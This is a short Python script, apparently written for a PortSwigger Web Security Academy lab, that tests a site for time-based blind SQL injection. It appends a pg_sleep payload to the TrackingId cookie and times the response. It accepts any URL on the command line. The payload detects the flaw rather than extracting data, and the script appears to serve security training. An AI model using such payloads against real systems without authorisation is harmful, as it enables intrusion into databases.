import sys, urllib, urllib3, requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


r = requests.get('https://accc1f4c1fad95fbc05a1d7000a600d7.web-security-academy.net/', verify=False)

def find_cookes(url):
    r = requests.get(url, verify=False, proxies=proxies)
    print(f"[+] Cookes:{r.cookies.get_dict()}")
    return r.cookies.get_dict()

def sqli(url):
    cookie = find_cookes(url)
    payload = "' || (SELECT pg_sleep(10))--"
    encrypt_payload = urllib.parse.quote(payload)
    c = {'TrackingId':cookie['TrackingId']+encrypt_payload, 'session':cookie['session']}
    r = requests.get(url, cookies=c, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds()) > 10:
        return "(+) Vulnerable to blind-based SQL injection"
    else:
        return "(-) Not vulnerable to blind based SQL injection"

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except:
        print("[*] Usage: %s <url>" % sys.argv[0])
        print("[*] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    print(sqli(url))